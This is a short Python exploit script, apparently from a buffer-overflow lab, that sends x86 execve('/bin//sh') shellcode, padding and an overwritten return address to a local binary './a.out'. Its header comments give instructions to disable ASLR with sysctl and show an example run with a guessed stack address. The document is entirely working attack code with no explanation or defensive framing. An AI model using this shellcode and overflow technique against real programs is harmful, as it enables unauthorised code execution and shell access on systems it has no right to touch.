# comment
'''
- before running
  - ASLR off
    - $ sudo sysctl kernel.randomize_va_space=0
- run
  - python exploit.py 100 0xbffff05c

'''

import sys
import struct
from subprocess import Popen

#shell_code = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
shell_code = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

buf_size = int(sys.argv[1])
start_address_of_buf_and_shell_code = int(sys.argv[2], 16)

buf = shell_code
buf += 'A' * (buf_size - len(shell_code))
buf += 'AAAA' * 3
buf += struct.pack('<I', start_address_of_buf_and_shell_code)

#print buf

p = Popen(['./a.out', buf])
#sys.exit()
p.wait()
